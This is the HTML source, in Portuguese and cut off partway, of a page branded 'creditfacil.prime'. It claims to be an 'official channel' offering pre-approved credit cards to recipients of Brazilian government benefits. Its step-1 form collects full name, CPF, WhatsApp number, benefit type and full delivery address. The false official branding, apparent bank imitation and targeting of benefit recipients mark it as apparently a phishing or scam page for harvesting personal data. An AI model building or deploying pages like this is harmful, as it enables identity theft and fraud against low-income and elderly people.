<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>creditfacil.prime | Portal Oficial de Crédito e Benefícios</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <style>
    body {
      background-color: #051329;
      color: #f3f4f6;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
    }
    .pan-card {
      background: #0b1d3a;
      border: 1px solid #1e3a6e;
      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.6), 0 8px 10px -6px rgba(0, 0, 0, 0.6);
    }
    .pan-btn-primary {
      background: #00d2ff;
      color: #051329;
      font-weight: 800;
      transition: all 0.2s ease-in-out;
    }
    .pan-btn-primary:hover {
      background: #00b4d8;
      box-shadow: 0 0 20px rgba(0, 210, 255, 0.4);
    }
    .step-indicator.active {
      background-color: #00d2ff;
      color: #051329;
    }
    .credit-card-preview {
      background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
      border: 1px solid rgba(0, 210, 255, 0.3);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    }
  </style>
</head>
<body class="min-h-screen flex flex-col justify-between">

  <!-- Topbar Institucional -->
  <header class="w-full bg-[#030b1b] border-b border-[#1e3a6e] sticky top-0 z-50 px-4 py-3">
    <div class="max-w-xl mx-auto flex items-center justify-between">
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 rounded-lg bg-[#00d2ff]/20 border border-[#00d2ff]/40 flex items-center justify-center">
          <i class="fa-solid fa-building-columns text-[#00d2ff] text-sm"></i>
        </div>
        <span class="text-lg font-black tracking-wider text-white">
          creditfacil.<span class="text-[#00d2ff]">prime</span>
        </span>
      </div>
      <div class="flex items-center gap-1.5 bg-[#00d2ff]/10 border border-[#00d2ff]/30 px-3 py-1 rounded-full text-[11px] font-bold text-[#00d2ff]">
        <i class="fa-solid fa-shield-halved text-xs"></i> Canal Oficial
      </div>
    </div>
  </header>

  <!-- Banner Superior -->
  <div class="bg-gradient-to-r from-[#030b1b] via-[#0b1d3a] to-[#030b1b] border-b border-[#1e3a6e] py-2.5 px-4 text-center">
    <p class="text-xs font-semibold text-gray-200">
      <i class="fa-solid fa-circle-info text-[#00d2ff] mr-1.5"></i>
      Cartão de Crédito com Limite Pré-Aprovado para beneficiários de <span class="text-[#00d2ff] font-bold">Auxílios e Programas do Governo</span>.
    </p>
  </div>

  <!-- Conteúdo Principal -->
  <main class="w-full max-w-xl mx-auto px-4 py-6 my-auto">

    <div class="pan-card rounded-2xl p-6 md:p-8">

      <!-- Indicador de Etapas -->
      <div class="flex items-center justify-between border-b border-[#1e3a6e] pb-5 mb-6 text-xs font-bold text-gray-400">
        <div class="flex items-center gap-2">
          <span id="badge-step-1" class="step-indicator active w-6 h-6 rounded-full flex items-center justify-center text-xs">1</span>
          <span id="text-step-1" class="text-white">Simulação</span>
        </div>
        <div class="h-0.5 w-8 bg-[#1e3a6e]"></div>
        <div class="flex items-center gap-2">
          <span id="badge-step-2" class="step-indicator bg-[#1e3a6e] text-gray-400 w-6 h-6 rounded-full flex items-center justify-center text-xs">2</span>
          <span id="text-step-2">Validação</span>
        </div>
        <div class="h-0.5 w-8 bg-[#1e3a6e]"></div>
        <div class="flex items-center gap-2">
          <span id="badge-step-3" class="step-indicator bg-[#1e3a6e] text-gray-400 w-6 h-6 rounded-full flex items-center justify-center text-xs">3</span>
          <span id="text-step-3">Aprovação</span>
        </div>
      </div>

      <!-- ETAPA 1: DADOS + ENDEREÇO -->
      <div id="step-1-content">
        <div class="mb-6">
          <h2 class="text-xl font-black text-white tracking-tight">Simule o seu Limite Pré-Aprovado</h2>
          <p class="text-xs text-gray-300 mt-1">Preencha seus dados para consulta imediata e envio do cartão físico.</p>
        </div>

        <form id="form-step-1" class="space-y-3.5" onsubmit="event.preventDefault(); avancarParaAnalise();">
          <div>
            <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">Nome Completo</label>
            <input type="text" id="input-nome" required placeholder="Digite seu nome completo" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]" />
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
            <div>
              <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">CPF do Titular</label>
              <input type="text" id="input-cpf" required placeholder="000.000.000-00" oninput="mascaraCpf(this)" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]" />
            </div>
            <div>
              <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">WhatsApp de Contato</label>
              <input type="text" id="input-tel" required placeholder="(00) 00000-0000" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]" />
            </div>
          </div>

          <div>
            <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">Qual benefício ou auxílio do governo você recebe?</label>
            <select id="input-beneficio" required class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]">
              <option value="" disabled selected>Selecione seu benefício / auxílio...</option>
              <option value="Bolsa Família">Bolsa Família</option>
              <option value="BPC / LOAS">BPC / LOAS (Idoso ou Deficiência)</option>
              <option value="Auxílio Gás">Auxílio Gás dos Brasileiros</option>
              <option value="Auxílio Gás Estadual">Auxílio Gás Estadual / Regional</option>
              <option value="Pé-de-Meia">Programa Pé-de-Meia (Estudantes)</option>
              <option value="Aposentado/Pensionista INSS">Aposentado ou Pensionista INSS</option>
              <option value="Outros Auxílios Sociais">Outros Auxílios e Programas Sociais</option>
            </select>
          </div>

          <div class="grid grid-cols-3 gap-3">
            <div class="col-span-2">
              <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">CEP de Entrega</label>
              <input type="text" id="input-cep" required placeholder="00000-000" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]" />
            </div>
            <div>
              <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">Estado (UF)</label>
              <input type="text" id="input-uf" required placeholder="Ex: SP" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white uppercase focus:outline-none focus:border-[#00d2ff]" />
            </div>
          </div>

          <div>
            <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">Endereço Completo (Rua, Nº e Bairro)</label>
            <input type="text" id="input-endereco" required placeholder="Ex: Rua das Flores, 123 - Centro" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]" />
          </div>

          <button type="submit" class="w-full py-4 rounded-xl pan-btn-primary text-sm uppercase tracking-wider flex items-center justify-center gap-2 mt-3 cursor-pointer">
            <span>Consultar Limite Grátis</span>
            <i class="fa-solid fa-arrow-right"></i>
          </button>
        </form>
      </div>

      <!-- ETAPA 2: ANÁLISE / CARREG
